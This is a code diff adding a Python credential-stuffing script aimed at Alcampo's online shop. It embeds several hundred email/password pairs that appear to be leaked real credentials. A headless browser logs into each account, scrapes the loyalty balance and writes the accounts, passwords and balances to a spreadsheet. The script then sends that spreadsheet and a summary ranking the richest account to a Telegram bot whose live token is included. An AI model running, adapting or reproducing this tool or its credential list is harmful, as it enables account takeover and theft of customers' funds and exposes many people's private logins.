+  {"email": "andres-salin@hotmail.com", "password": "A02030203a"},
+  {"email": "mai39_calero@hotmail.es", "password": "Las3marias"},
+  {"email": "jesusmv2004@yahoo.es", "password": "Jesus100"},
+  {"email": "macu_1128@hotmail.es", "password": "Ramos1128"},
+  {"email": "ngarciagracia@yahoo.es", "password": "Cachis123"},
+  {"email": "sradesilva@yahoo.es", "password": "Ps190506"},
+  {"email": "sosule2002@yahoo.es", "password": "Aa667800"},
+  {"email": "albaariasconde@hotmail.es", "password": "19Alba89"},
+  {"email": "avix@movistar.es", "password": "Teresa01"},
+  {"email": "noeliavicario@hotmail.es", "password": "Iloveme90!"},
+  {"email": "yo.yesi@hotmail.es", "password": "Anguelf0"},
+  {"email": "josecalvo1989@hotmail.com", "password": "250715Matias"},
+  {"email": "annapar@hotmail.es", "password": "Sevilla2006"},
+  {"email": "christianuclespledger@gmail.com", "password": "Chris10071985"},
+  {"email": "neus_1987@hotmail.es", "password": "Nacien1987"},
+  {"email": "laura_cm1@hotmail.es", "password": "Bigotes1"},
+  {"email": "aliciavallssalas@yahoo.es", "password": "Cacadevaca21"},
+  {"email": "heras_laura@yahoo.es", "password": "Lauris1986"},
+  {"email": "sportelarojo@yahoo.es", "password": "Cabral10"},
+  {"email": "doradonogales@yahoo.es", "password": "Paolita2000"},
+  {"email": "celiacolmenar@yahoo.es", "password": "Celia007"},
+  {"email": "barcia38@gmail.com", "password": "44806792Dd"},
+  {"email": "josebe31@yahoo.es", "password": "Labiano31"},
+  {"email": "estepc2001@gmail.com", "password": "TysonLua20"},
+  {"email": "roxy_iviasa@yahoo.es", "password": "Alejandro@@2007"},
+  {"email": "malak2012343@gmail.com", "password": "AFamj1946"},
+  {"email": "zapatafernandezc@yahoo.es", "password": "Gabriela1501"},
+  {"email": "velezzapatam@yahoo.es", "password": "Chipotle33"},
+  {"email": "j_nunez_pena@yahoo.es", "password": "Cabra1973"},
+  {"email": "sarahbaes@yahoo.es", "password": "Sarahbaes22"},
+  {"email": "vanessa.alvarez70@yahoo.es", "password": "Vanessa109747"},
+  {"email": "chemasa@yahoo.es", "password": "123456As"},
+  {"email": "rociozaragoza_73@hotmail.es", "password": "Arizaida2"},
+  {"email": "fervios@yahoo.es", "password": "008366Dfc"},
+  {"email": "jposadasramos@gmail.com", "password": "Posadas101"},
+  {"email": "alilobatosantos@yahoo.es", "password": "335990Als"},
+  {"email": "estefaniarodo@hotmail.es", "password": "26Mayo1992"},
+  {"email": "luisfreites.es@gmail.com", "password": "Lafu6767088*"},
+  {"email": "patrigon9@gmail.com", "password": "Pg260575"},
+  {"email": "ejaso20@yahoo.es", "password": "22Naiara"},
+  {"email": "ringochus@yahoo.es", "password": "Naia2010"},
+  {"email": "margoniz@hotmail.es", "password": "Minumeroesel7"},
+  {"email": "raquel.roldan.montero@hotmail.es", "password": "Raqueta93"},
+  {"email": "amaia_hanna@yahoo.es", "password": "Guinnes149"},
+  {"email": "luciaesca@outlook.es", "password": "Lucia17."},
+  {"email": "kuroanddisney@gmail.com", "password": "Mtrsk5241!"},
+  {"email": "lauraialfonso@yahoo.es", "password": "Enric02122004"},
+  {"email": "soniamiguez77@yahoo.es", "password": "Taniaam2005"},
+  {"email": "munoz_pilar@yahoo.es", "password": "Pms290975"},
+  {"email": "enriquemaartin@gmail.com", "password": "Cochealos18*"},
+  {"email": "rrddtorres@yahoo.es", "password": "Robertito7"},
+  {"email": "tefemag@yahoo.es", "password": "Tere3782"},
+  {"email": "sabahkardache10@gmail.com", "password": "Lool4cool"},
+  {"email": "debo1190@hotmail.es", "password": "Debora1982"},
+  {"email": "lucyliu39@hotmail.com", "password": "Cbypcl9532"},
+  {"email": "008angel@hotmail.es", "password": "Crespo08"},
+  {"email": "jabansola@yahoo.es", "password": "Sagasta26"},
+  {"email": "nayras@yahoo.es", "password": "Sefocuma1"},
+  {"email": "chacanana@yahoo.es", "password": "cRg@1982"},
+  {"email": "joserb2@yahoo.es", "password": "User6911"},
+  {"email": "tervichec@hotmail.es", "password": "Teresa1977"},
+  {"email": "valcalle@yahoo.es", "password": "Moratoria112"},
+  {"email": "sicomantiss@gmail.com", "password": "Aeripont1"},
+  {"email": "virtusanchez75@gmail.com", "password": "Morricas75"},
+  {"email": "bugedoarnauana@gmail.com", "password": "Tejona1972"},
+  {"email": "rubiom@uji.es", "password": "Martamarcos270"},
+  {"email": "bmartin14@hotmail.es", "password": "Begontxu14"},
+  {"email": "rosa.burgos@hotmail.es", "password": "Alba1608"},
+  {"email": "cristinita.92@hotmail.es", "password": "Andesteiro22"},
+  {"email": "tizucaes@yahoo.es", "password": "Piriki1520"},
+  {"email": "maipego@yahoo.es", "password": "Carrascal8"},
+  {"email": "cesarloli@hotmail.es", "password": "Cesar2006"},
+  {"email": "noemiciruela@hotmail.es", "password": "Irati2007"},
+  {"email": "pin_pon_74@yahoo.es", "password": "Pini2012"},
+  {"email": "carmen.nuska@gmail.com", "password": "A20041201c"},
+  {"email": "lmplaza@gmail.com", "password": "Doraimon00"},
+  {"email": "lpsaez@yahoo.es", "password": "Paco011210"},
+  {"email": "masfrio2009@hotmail.es", "password": "010197Na"},
+  {"email": "tadeva@hotmail.es", "password": "Alcala318"},
+  {"email": "fromwonderland@hotmail.es", "password": "Oo19112011**"},
+  {"email": "gonipterus@yahoo.es", "password": "Ra240585"},
+  {"email": "anbelzunegui@hotmail.es", "password": "Cacafuti123520"},
+  {"email": "adhemir_napa_21@hotmail.es", "password": "Bryan200"},
+  {"email": "judithgc78@hotmail.es", "password": "Alex2009"},
+  {"email": "loscuervastreet@yahoo.es", "password": "Lv271011"},
+  {"email": "m.marquezruiz@hotmail.es", "password": "Lourdes22"},
+  {"email": "lolabazarra@yahoo.es", "password": "Lola2402"},
+  {"email": "rosacj76@gmail.com", "password": "110992Rcj"},
+  {"email": "carmeta662010@hotmail.com", "password": "Carmeta.66"},
+  {"email": "letimsagasta@yahoo.es", "password": "Gonzalo1Maria2"},
+  {"email": "ormgc@yahoo.es", "password": "Pancracio1"},
+  {"email": "felicidadsalvador@yahoo.com", "password": "MA7813gz"},
+  {"email": "jesusdenia15@gmail.com", "password": "Jesus1707"},
+  {"email": "jolumayo@hotmail.com", "password": "Touran2007"},
+  {"email": "juanjo.caravaca@gmail.com", "password": "358FbA68"},
+  {"email": "jlp56@telefonica.net", "password": "Yara0114"},
+  {"email": "illel9298@hotmail.com", "password": "Nela2011"},
+  {"email": "kikorc@gmail.com", "password": "X3008n1012!"},
+  {"email": "j100873@hotmail.com", "password": "jerHINgar13"},
+    {"email": "sergiocortesmanteiga@yahoo.es", "password": "Dragona82"},
+  {"email": "albabi@gmail.com", "password": "Polidori=55"},
+  {"email": "felipesanchezquemasda@gmail.com", "password": "Mafer1977"},
+  {"email": "bego1881@gmail.com", "password": "18Demayode1981"},
+  {"email": "daviddelgado_4@hotmail.com", "password": "Note8013"},
+  {"email": "eugeniosimon14@hotmail.com", "password": "Bailen89"},
+  {"email": "carmenbonaparte@telefonica.net", "password": "Picasso99"},
+  {"email": "dadom845@gmail.com", "password": "Dadom1005494290!"},
+  {"email": "angelines_2009@hotmail.es", "password": "Nines.3082"},
+  {"email": "olga.lopez06@yahoo.es", "password": "Raqueleva1972"},
+  {"email": "kike.emb@gmail.com", "password": "Sas5691ki"},
+  {"email": "raulgosalbez.rgn@gmail.com", "password": "R17g02n1958#"},
+  {"email": "Veroka_joel29@hotmail.com", "password": "578261Jh"},
+  {"email": "mcarbocalafi@yahoo.es", "password": "Apocalip6"},
+  {"email": "gigi.oana22@yahoo.es", "password": "Andreea29"},
+  {"email": "eguiluz5@gmail.com", "password": "N0vatones"},
+  {"email": "co_rubio@yahoo.es", "password": "Angelito10"},
+  {"email": "alex84v.ss@gmail.com", "password": "10Enero1984"},
+  {"email": "rosalialemos@andaluciajunta.es", "password": "Da281206"},
+  {"email": "franguajardo_70@hotmail.es", "password": "26Julio1970"},
+  {"email": "daniel@profesionalesmarketing.es", "password": "Tuteja-01"},
+  {"email": "inmafdezr@yahoo.es", "password": "Inmaculada1"},
+  {"email": "pincharrata68@hotmail.com", "password": "Mrmagoo15"},
+  {"email": "diguvac@gmail.com", "password": "Laura001"},
+  {"email": "victoriacarolina230101@gmail.com", "password": "Carolina2001"},
+  {"email": "mcanchuelo@gmail.com", "password": "Anchuelo1"},
+  {"email": "anandanoda@yahoo.es", "password": "635177815aA"},
+  {"email": "rkash1802@gmail.com", "password": "Az.18.02"},
+  {"email": "albano_555@hotmail.com", "password": "Fernandez86"},
+  {"email": "miriamvb96@gmail.com", "password": "Diva@0910f"},
+  {"email": "losveris@hotmail.com", "password": "Meganex321"},
+  {"email": "celsoprieto@hotmail.com", "password": "Celso3192"},
+  {"email": "petarbadalov@gmail.com", "password": "Bmwclub6"},
+  {"email": "sandra.alvarezperez@hotmail.com", "password": "Baltoystich1"},
+  {"email": "gfmarisa@hotmail.com", "password": "Forxas82"},
+  {"email": "ferncrist@hotmail.com", "password": "Astra205"},
+  {"email": "linaportas@yahoo.es", "password": "Lihe6972"},
+  {"email": "mabadmtnz@yahoo.es", "password": "Budia100"},
+  {"email": "SERGIORUBINLARGO@GMAIL.COM", "password": "ASDfgh.1"},
+  {"email": "canedo82@hotmail.es", "password": "Mika201082"},
+  {"email": "raspya@gmail.com", "password": "Adrian2010"},
+  {"email": "fvalarcon@hotmail.com", "password": "Ppaco8669"},
+  {"email": "santiago.moledo@gmail.com", "password": "0g41tn4S1107"},
+  {"email": "almarpin@hotmail.es", "password": "Romerillo87"},
+  {"email": "lidiandreo@gmail.com", "password": "Lidiandreo#5"},
+  {"email": "oscarbernardez@hotmail.com", "password": "Hikaru84"},
+  {"email": "roroxan.lo.92@gmail.com", "password": "Rocioha000"},
+  {"email": "p72gurej@hotmail.com", "password": "Guerrer@1"},
+  {"email": "margaritayanchen@hotmail.com", "password": "Torrejon0099."},
+  {"email": "luisdeogp@gmail.com", "password": "Deogracias1"},
+  {"email": "felixmadridromero@gmail.com", "password": "David2015."},
+  {"email": "amper@gmx.es", "password": "1509.Xastin"},
+  {"email": "jafdezramon@hotmail.com", "password": "Degesa1966"},
+  {"email": "beainvercasa@hotmail.es", "password": "Carne100"},
+  {"email": "jcm_jonathan@hotmail.com", "password": "Nofear822024518"},
+  {"email": "marivalpaniagua@yahoo.es", "password": "Sumial2014"},
+  {"email": "robertomartin89@gmail.com", "password": "Roberto1!"},
+  {"email": "edgarlozano1989@gmail.com", "password": "12041989Elc"},
+  {"email": "muvos2003@yahoo.es", "password": "Hope2016"},
+  {"email": "mehmedovicadis@gmail.com", "password": "Sammsung81"},
+  {"email": "mguerrerotorrecillas@gmail.com", "password": "Amstick87918791"},
+  {"email": "natalialarrad@yahoo.es", "password": "Bach1750"},
+  {"email": "alfredo@nacino.net", "password": "Avr.T*2q"},
+  {"email": "susamayor@gmail.com", "password": "Cuenca2924"},
+  {"email": "elodins@yahoo.es", "password": "Ainsa2006"},
+  {"email": "elenamarben@hotmail.es", "password": "12Ago1966"},
+  {"email": "borjabb31@hotmail.es", "password": "BBbb8535"},
+  {"email": "f.cascares@hotmail.es", "password": "Truenoazul1"},
+  {"email": "olguipulgui@yahoo.es", "password": "Manifesto1973"},
+  {"email": "irene.martinez12@alu.uclm.es", "password": "73Ma28Ir"},
+  {"email": "julenmartinez.jm@gmail.com", "password": "Mrpingu.88"},
+  {"email": "enyen3@yahoo.es", "password": "Enero2000"},
+  {"email": "acslectorseglarvalencia@gmail.com", "password": "Landor9423"},
+  {"email": "sergiomarcor@hotmail.es", "password": "Sergio22"},
+  {"email": "ire.98@hotmail.es", "password": "Ireser5198"},
+  {"email": "chushera@yahoo.es", "password": "Olea2015"},
+  {"email": "carlos@comerciallyc.es", "password": "LUC22car11"},
+  {"email": "ramon.royo@hotmail.es", "password": "Toyota13"},
+  {"email": "Zhenda@hotmail.es", "password": "Mamaloles13"},
+  {"email": "erd28drn@gmail.com", "password": "DavidLia0305"},
+  {"email": "javiarestin@gmail.com", "password": "Guapo112"},
+  {"email": "anamaria_laisla@hotmail.com", "password": "Minisdef01"},
+  {"email": "helenadv2000@yahoo.es", "password": "Nada201199"},
+  {"email": "jorgealquezar@gmail.com", "password": "Fraggle13"},
+  {"email": "morcisfamili@gmail.com", "password": "Marcutus01"},
+  {"email": "e_camara_f@yahoo.es", "password": "Camara13"},
+  {"email": "lauritafergal@gmail.com", "password": "Passcuenta20"},
+  {"email": "jadiezeli@yahoo.es", "password": "Azul2000"},
+  {"email": "slizeres9@gmail.com", "password": "Viridia1989."},
+  {"email": "cristinamiguel2000@yahoo.es", "password": "19741974Cv"},
+  {"email": "patricia@maservicios.es", "password": "Viladecans-1"},
+  {"email": "maridelcura@hotmail.com", "password": "Mdelcura.10"},
+  {"email": "javi.go@hotmail.es", "password": "javi7065JVG!"},
+  {"email": "deny_dav3@yahoo.com", "password": "Acasa2109"},
+  {"email": "josemiguel.zeadeagustin@gmail.com", "password": "@Mz3832228"},
+  {"email": "estirear18@yahoo.es", "password": "Ias240821"},
+  {"email": "nuriaplazaherrero@gmail.com", "password": "Nanicoco2316"},
+  {"email": "ruben_esk@hotmail.com", "password": "08460847Ruben"},
+  {"email": "natalia.xvv@hotmail.com", "password": "Larika12"},
+  {"email": "nuriadm85@hotmail.com", "password": "Ndm3235ndm"},
+  {"email": "slizaga@gmail.com", "password": "Miranda2"},
+  {"email": "Mustris@yahoo.es", "password": "Martina8"},
+  {"email": "FURANCHO3@HOTMAIL.COM", "password": "Queizas72"},
+  {"email": "mjheres18@yahoo.es", "password": "pillo@72@p"},
+  {"email": "oscarelchos@hotmail.com", "password": "Ch0sc020"},
+  {"email": "vicentetarin@yahoo.es", "password": "Matu0123"},
+  {"email": "revenller71.cdl@gmail.com", "password": "Arecica71"},
+  {"email": "manuelop8@gmail.com", "password": "48713067xX)"},
+  {"email": "pilar_escena@yahoo.es", "password": "653115817Mlgc"},
+  {"email": "marta_x_u@hotmail.com", "password": "Marta1998"},
+  {"email": "juandydecai@gmail.com", "password": "Chauche3"},
+  {"email": "nachohidesp@gmail.com", "password": "Cocoliso00"},
+  {"email": "jcarees@hotmail.com", "password": "0669Susana"},
+  {"email": "maria.lagunacoca@hotmail.com", "password": "Anita222"},
+  {"email": "adrianpanes@hotmail.com", "password": "Acorsan1981*"},
+  {"email": "gogarici2002@yahoo.com", "password": "Philips2016"},
+  {"email": "gmartinruiz17@gmail.com", "password": "Goku2018"},
+  {"email": "fernandaleonmarquez@yahoo.es", "password": "Bebeasier07"},
+  {"email": "lolyarcecuenca@yahoo.es", "password": "Delfin.79"},
+  {"email": "marinlor@yahoo.es", "password": "Boira2001"},
+  {"email": "relojius@gmail.com", "password": "Inmortal1"},
+  {"email": "paoolga@hotmail.es", "password": "Alejandra2007"},
+  {"email": "aliciasanchez7@yahoo.es", "password": "Gonzalete10"},
+  {"email": "oscarordonezrodas0507@gmail.com", "password": "Ger@mxm0507"},
+  {"email": "uausukua@gmail.com", "password": "Pel0taza$"},
+  {"email": "verokydj46@hotmail.es", "password": "Dinerodinero46"},
+  {"email": "emalquezar@gmail.com", "password": "G.ague67"},
+  {"email": "tiablanki@hotmail.es", "password": "19Egipto82"},
+  {"email": "joseaguileram@yahoo.es", "password": "CA-2543-Bm"},
+  {"email": "jtrodriguezg@yahoo.es", "password": "Mula2010"},
+  {"email": "abraham109cx@gmail.com", "password": "asq1G3n952D@tmX"},
+  {"email": "carmenlopezjoyas@gmail.com", "password": "Maria1988"},
+  {"email": "Fdmmoi@gmail.com", "password": "Fernando007"},
+  {"email": "maycortacero@hotmail.com", "password": "Ceteris1998"},
+  {"email": "paomba@hotmail.com", "password": "Pao19pao"},
+  {"email": "el_lobo_1989@hotmail.com", "password": "Erviru-120"},
+  {"email": "maapariciog@outlook.es", "password": "Emily070614"},
+  {"email": "jlchamizob@gmail.com", "password": "Jeirce1967"},
+  {"email": "piolinakiko80@gmail.com", "password": "ChavaKiko23"},
+  {"email": "amcbaeza14@gmail.com", "password": "Carmencita14"},
+  {"email": "rubencueto78@gmail.com", "password": "rcg701478RCG"},
+  {"email": "mvrojasa@hotmail.com", "password": "Opuntia163d"},
+  {"email": "vastago0@gmail.com", "password": "Riovolt4707"},
+  {"email": "carro07@gmail.com", "password": "Carrillo1"},
+  {"email": "soyfelizchiki@hotmail.com", "password": "Chikitina1"},
+  {"email": "abdelluis735@gmail.com", "password": "Diego7955"},
+  {"email": "deborapm92@gmail.com", "password": "RockyMax1992"},
+  {"email": "alvarezalija@movistar.es", "password": "Lugarin54"},
+  {"email": "ngarcia@elecnor.es", "password": "Nolecnor1975"},
+  {"email": "jacidrubio@gmail.com", "password": "Jose1984"},
+  {"email": "patofarinas@Yahoo.es", "password": "Placida123"},
+  {"email": "ascenhv@yahoo.es", "password": "Aa2012Pp"},
+  {"email": "ladjikone43@gmail.com", "password": "KVEvnxf12"},
+  {"email": "marianocortizo@gmail.com", "password": "Mariano00"},
+  {"email": "nur_97@hotmail.es", "password": "Babyboo.09"},
+  {"email": "jealherla@hotmail.com", "password": "Galactico8"},
+  {"email": "isidoro_miguel@yahoo.es", "password": "Parcela01"},
+  {"email": "bedelgar90@gmail.com", "password": "Bea241990"},
+  {"email": "Pilar.gb@hotmail.com", "password": "Pilar1980"},
+  {"email": "marylin19@outlook.es", "password": "Christopher19"},
+  {"email": "jnaviarca@yahoo.es", "password": "Sandra060408"},
+  {"email": "garciacarpintero90@hotmail.es", "password": "Carpintero90"},
+  {"email": "yuriazevedo1107@gmail.com", "password": "660817400aA"},
+  {"email": "bourial2012@hotmail.com", "password": "Tanger1604"},
+  {"email": "mpg91@hotmail.com", "password": "M04229239e"},
+  {"email": "javicaballerorodriguez@yahoo.es", "password": "JxN280398"},
+  {"email": "victor.cerezo@gmail.com", "password": "Kilita77"},
+  {"email": "jgb@doisa.org", "password": "Tejgblcm1"},
+  {"email": "manolillo.68@hotmail.es", "password": "Camionero113"},
+  {"email": "silviasencio03@gmail.com", "password": "Silvia2003."},
+  {"email": "sonia_lagoa.94@live.com", "password": "Lonuestro4"},
+  {"email": "ramonmendez16@hotmail.com", "password": "Ramonmendez58"},
+  {"email": "lorena11bailen@gmail.com", "password": "Lorena13"},
+  {"email": "solanssi@gmail.com", "password": "13x666IN"},
+  {"email": "fernandocuestalopez@gmail.com", "password": "Tate_24."},
+  {"email": "alinardelean001@gmail.com", "password": "Alinuelmejor2001"},
+  {"email": "antonio.fernandez.hernandez@gmail.com", "password": "6Rd2a4y0A"},
+  {"email": "rociots@hotmail.com", "password": "ChechoLolaya2020"},
+  {"email": "morena_e3@yahoo.es", "password": "00Papito"},
+  {"email": "gustavo18200@hotmail.com", "password": "X5627039c"},
+  {"email": "mgrpazos@gmail.com", "password": "120548XnQfpjyU"},
+  {"email": "nuriavilas@yahoo.es", "password": "Javi08092013"},
+  {"email": "lauramr@outlook.com", "password": "Belfast13"},
+  {"email": "angelcarlosmarquina@yahoo.es", "password": "03Anhell03"},
+  {"email": "bknaranjo@gmail.com", "password": "Enero2019"},
+  {"email": "isasoler79@hotmail.com", "password": "Isabel1979"},
+  {"email": "ipuyadena@gmail.com", "password": "Uk2MFJ9wpwf/Zv%"},
+  {"email": "jamq87@gmail.com", "password": "Informatico123."},
+  {"email": "josuecaleton@hotmail.com", "password": "Jaramillo1"},
+  {"email": "sebacarballo63@gmail.com", "password": "Nico2014"},
+  {"email": "nandocanomarques@hotmail.es", "password": "Mastin11072008"},
+  {"email": "mariaserranogonzalez@hotmail.com", "password": "JyM170306"},
+  {"email": "percyabogado@hotmail.com", "password": "1Neopower$"},
+  {"email": "sandracibreiro@gmail.com", "password": "sanDrelina2014"},
+  {"email": "lisarey@hotmail.es", "password": "Nikita23"},
+  {"email": "iago_padin@hotmail.es", "password": "Iagopadin25"},
+  {"email": "sylviads15@yahoo.es", "password": "Sardina15"},
+  {"email": "eloy.rakel@hotmail.es", "password": "Eloykkeloykk12"},
+  {"email": "pili.3009@yahoo.es", "password": "Misnenas2"},
+  {"email": "jjperal71@gmail.com", "password": "Donostia1"},
+  {"email": "bibiana.santosj@gmail.com", "password": "Kimbo2011"},
+  {"email": "URIBEMIREN@GMAIL.COM", "password": "Cocacola500"},
+  {"email": "maritesalmeron@yahoo.es", "password": "Rosales25156F"},
+  {"email": "vicolandia_87@hotmail.com", "password": "Pilila87"},
+  {"email": "rosamcordon@gmail.com", "password": "30Mireia08"},
+  {"email": "rua@hotmail.es", "password": "Mercedes-C220"},
+  {"email": "srta.kawaii13@gmail.com", "password": "71180440Vv"},
+  {"email": "lokatty@hotmail.es", "password": "coronaviruS19"}
+]
+
+# =======================
+# TELEGRAM CONFIG
+# =======================
+TELEGRAM_TOKEN = "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU"
+CHAT_ID = -5049278431   # Tu chat_id
+
+def enviar_telegram_texto(mensaje):
+    """Envía texto por Telegram."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": mensaje}
+    try:
+        response = requests.post(url, data=data)
+        print(f"📡 Enviando a Telegram: {response.status_code} - {response.text}")
+        response.raise_for_status()
+    except Exception as e:
+        print(f"❌ Error CRÍTICO enviando a Telegram: {e}")
+
+def enviar_telegram_documento(path, caption=""):
+    """Envía un archivo por Telegram."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+    try:
+        with open(path, "rb") as file:
+            data = {"chat_id": CHAT_ID, "caption": caption}
+            response = requests.post(url, data=data, files={"document": file})
+            print(f"📁 Enviando documento a Telegram: {response.status_code} - {response.text}")
+            response.raise_for_status()
+    except Exception as e:
+        print(f"❌ Error CRÍTICO enviando documento a Telegram: {e}")
+
+# =======================
+# FUNCION PARA PROCESAR CUENTA
+# =======================
+# Notificar inicio de ejecuciÃ³n
+try:
+    enviar_telegram_texto("ðŸš€ Iniciando script de Alcampo...")
+except Exception as e:
+    print(f"Error enviando mensaje de inicio: {e}")
+
+def procesar_cuenta(email, password):
+    print(f"\n→→ Procesando cuenta: {email}")
+    
+    intentos_max = 3
+    
+    for intento in range(1, intentos_max + 1):
+        driver = None
+        try:
+            if intento > 1:
+                print(f"⚠️ Reintentando {email} (Intento {intento}/{intentos_max})...")
+
+            chrome_options = Options()
+            chrome_options.add_argument("--headless=new")
+            chrome_options.add_argument("--disable-gpu")
+            chrome_options.add_argument("--no-sandbox")
+            chrome_options.add_argument("--disable-dev-shm-usage")
+            
+            # Use the pre-installed chromedriver
+            driver = webdriver.Chrome(
+                service=Service(CHROME_DRIVER_PATH),
+                options=chrome_options
+            )
+
+            driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
+            time.sleep(3)
+
+            email_field = driver.find_element(By.ID, "uname1")
+            password_field = driver.find_element(By.ID, "pwd1")
+
+            email_field.send_keys(email)
+            password_field.send_keys(password)
+            password_field.send_keys(Keys.ENTER)
+            time.sleep(5)
+
+            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
+            time.sleep(2)
+            driver.refresh()
+            time.sleep(3)
+
+            saldo = "No encontrado"
+            try:
+                elemento = driver.find_element(
+                    By.XPATH,
+                    "/html/body/div[1]/div/div[1]/main/div[2]/div[2]/div/div/span"
+                )
+                saldo = elemento.text.strip()
+            except:
+                pass
+
+            print(f"✔ {email} → SALDO: {saldo}")
+            return {"email": email, "password": password, "saldo": saldo}
+
+        except Exception as e:
+            print(f"❌ Error en {email} (Intento {intento}): {e}")
+            if intento == intentos_max:
+                return {"email": email, "password": password, "saldo": f"Error: {e}"}
+            time.sleep(3) # Esperar antes de reintentar
+
+        finally:
+            if driver:
+                driver.quit()
+
+# =======================
+# EJECUTAR TODO EN PARALELO
+# =======================
+resultados = []
+
+print("\n🔥 Ejecutando todas las cuentas en paralelo...\n")
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    futures = [executor.submit(procesar_cuenta, acc["email"], acc["password"]) for acc in ACCOUNTS]
+    for future in as_completed(futures):
+        resultados.append(future.result())
+
+# =======================
+# GUARDAR RESULTADOS EN EXCEL
+# =======================
+df = pd.DataFrame(resultados)
+excel_path = "saldos_alcampo.xlsx"
+df.to_excel(excel_path, index=False)
+
+print("\n💾 Datos guardados en:", excel_path)
+
+# =======================
+# CALCULAR RESUMEN Y ENVIAR
+# =======================
+def limpiar_saldo(saldo_str):
+    """Convierte texto con número de saldo a float, o devuelve None si no hay saldo válido."""
+    if saldo_str is None:
+        return None
+
+    texto = str(saldo_str).strip()
+    if not texto:
+        return None
+
+    if "Error" in texto or "No encontrado" in texto:
+        return None
+
+    # Buscar el primer número válido en el texto, con coma o punto decimal
+    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
+    if not match:
+        return None
+
+    limpio = match.group(0).replace(',', '.')
+    try:
+        return float(limpio)
+    except ValueError:
+        return None
+
+saldo_total = 0.0
+cuenta_top = {"email": "N/A", "saldo_val": 0.0}
+cuentas_con_saldo = 0
+cuentas_saldo_cero = 0
+cuentas_error = 0
+
+for r in resultados:
+    valor = limpiar_saldo(r["saldo"])
+    if valor is None:
+        cuentas_error += 1
+        continue
+
+    saldo_total += valor
+    if valor > 0:
+        cuentas_con_saldo += 1
+    elif valor == 0:
+        cuentas_saldo_cero += 1
+
+    if valor > cuenta_top["saldo_val"]:
+        cuenta_top = {"email": r["email"], "saldo_val": valor}
+
+mensaje_resumen = (
+    f"📊 **RESUMEN ALCAMPO**\n\n"
+    f"✅ Cuentas procesadas: {len(resultados)}\n"
+    f"💰 **Saldo Total:** {saldo_total:.2f} €\n"
+    f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
+    f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
+    f"⚠️ Cuentas sin saldo válido: {cuentas_error}\n"
+    f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
+)
+
+print("\n" + mensaje_resumen)
+enviar_telegram_texto(mensaje_resumen)
+
+# =======================
+# ENVIAR UN SOLO MENSAJE CON EL EXCEL
+# =======================
+enviar_telegram_documento(
+    excel_path,
+    caption="📊 Reporte de saldos de cuentas Alcampo"
+)
+
+print("🎉 PROCESO COMPLETO Y ENVIADO A TELEGRAM\n")
